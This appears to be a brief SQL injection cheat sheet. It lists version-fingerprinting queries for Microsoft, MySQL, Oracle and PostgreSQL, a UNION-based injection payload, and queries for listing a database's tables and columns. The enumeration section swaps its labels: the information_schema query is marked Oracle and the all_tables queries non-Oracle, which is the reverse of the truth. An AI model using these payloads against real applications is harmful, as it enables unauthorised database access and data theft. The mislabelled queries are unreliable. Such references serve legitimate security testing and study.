# Querying the database type and version
- Microsoft, MySQL:	SELECT @@version
- Oracle:	SELECT * FROM v$version
- PostgreSQL:	SELECT version()
```
' UNION SELECT @@version--
```

# Listing the contents of the database
- Oracle:
  
  SELECT * FROM information_schema.columns WHERE table_name = 'Users'
- Non-Oracle:
  
  SELECT * FROM all_tables
  
  SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
